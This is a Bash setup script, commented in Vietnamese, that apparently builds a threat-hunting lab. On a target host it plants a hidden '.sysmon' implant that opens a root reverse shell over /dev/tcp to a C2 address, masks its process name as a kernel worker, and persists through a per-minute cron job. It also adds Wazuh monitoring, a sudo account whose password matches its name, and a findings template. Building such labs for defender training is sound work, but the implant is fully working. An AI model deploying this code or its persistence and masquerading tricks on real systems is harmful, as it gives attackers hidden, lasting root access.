#!/bin/bash
# Chay LAN DAU tren target, quyen 'ubuntu'. $1 = mat khau sudo.
# Gieo implant C2 nguy trang + log giam sat ket noi (/var/log/netmon.log) cho detection engineering.
PW="$1"
S(){ echo "$PW" | sudo -S "$@"; }

# ===== 1) Implant beacon (nguy trang 'sysmon') - cron moi phut =====
cat > /tmp/.sysmon <<'SH'
#!/bin/bash
# "sysmon" - thuc chat la beacon C2 nguy trang (persistence). Cron chay moi phut.
exec 2>/dev/null
# (a) LUON ghi su kien beacon vao log giam sat (cho detection) - moi lan chay, doc lap ket noi
printf '%s %s netmon: conn dst=172.20.0.5 dport=C2PORT proc=kworker-helper\n' "$(date '+%b %e %H:%M:%S')" "$(hostname)" >> /var/log/netmon.log
# (b) Giu DUY NHAT mot ket noi reverse shell; nguy trang ten tien trinh = [kworker/0:2]
exec 9>/tmp/.beacon.lock
flock -n 9 || exit 0
touch /tmp/.c2beacon
exec -a "[kworker/0:2]" bash -i >& /dev/tcp/172.20.0.5/C2PORT 0>&1
SH
S cp /tmp/.sysmon /usr/local/bin/.sysmon
S chmod 755 /usr/local/bin/.sysmon
S chown root:root /usr/local/bin/.sysmon

# ===== 2) Monitor ket noi (sinh dong lanh tinh lam nhieu + xac nhan .5 khi con ket noi) =====
cat > /tmp/netmon <<'SH'
#!/bin/bash
exec 2>/dev/null
ss -tn state established 2>/dev/null | tail -n +2 | awk '{print $NF}' | while read peer; do
  ip=${peer%:*}; port=${peer##*:}
  case "$ip" in ""|127.*|0.0.0.0|::*|*[!0-9.]*) continue;; esac
  printf '%s %s netmon: conn dst=%s dport=%s proc=monitor\n' "$(date '+%b %e %H:%M:%S')" "$(hostname)" "$ip" "$port" >> /var/log/netmon.log
done
SH
S cp /tmp/netmon /usr/local/bin/netmon
S chmod 755 /usr/local/bin/netmon
S bash -c ': > /var/log/netmon.log; chmod 644 /var/log/netmon.log'

# ===== 3) Persistence: cron moi phut (quyen root) =====
S bash -c 'printf "%s\n%s\n" "* * * * * root /usr/local/bin/.sysmon" "* * * * * root /usr/local/bin/netmon" > /etc/cron.d/sysmon; chmod 644 /etc/cron.d/sysmon'
S service cron restart 2>/dev/null || S systemctl restart cron 2>/dev/null || true
S service rsyslog start 2>/dev/null || S systemctl start rsyslog 2>/dev/null || true

# (Khong can ground-truth root: cong C2 ca nhan hoa duoc prestop doc lai tu chinh dong beacon
#  trong /var/log/netmon.log luc cham diem.)

# ===== 4) Wazuh agent: giam sat netmon.log (cho SV viet luat) + FIM (cho san qua dashboard) =====
LF='<localfile><log_format>syslog</log_format><location>/var/log/netmon.log</location></localfile>'
FIM='<directories realtime="yes" check_all="yes" report_changes="yes">/usr/local/bin,/etc/cron.d,/tmp</directories>'
S sed -i "s#</ossec_config>#${LF}</ossec_config>#" /var/ossec/etc/ossec.conf 2>/dev/null
S sed -i "s#<syscheck>#<syscheck>\n    ${FIM}#" /var/ossec/etc/ossec.conf 2>/dev/null
S systemctl restart wazuh-agent 2>/dev/null || S service wazuh-agent restart 2>/dev/null || true

# ===== 6) analyst cho DEFENDER SSH sang dieu tra =====
S useradd -m -s /bin/bash analyst 2>/dev/null
S bash -c 'echo "analyst:analyst" | chpasswd'
S usermod -aG sudo analyst 2>/dev/null
cat > /tmp/findings.txt <<'FND'
# BAO CAO SAN MOI DE DOA (Threat Hunting) - dien gia tri ban TU TIM DUOC (KEY=value):
# C2_IP      : dia chi may tan cong (C2)
# C2_PORT    : cong C2 (moi may mot khac - tu san ra)
# MAL_PROC   : ten tien trinh doc (nguy trang)
# MAL_SCRIPT : duong dan script/implant doc
C2_IP=
C2_PORT=
MAL_PROC=
MAL_SCRIPT=
FND
S cp /tmp/findings.txt /home/analyst/findings.txt
S chown analyst:analyst /home/analyst/findings.txt
S chmod 644 /home/analyst/findings.txt

exit 0
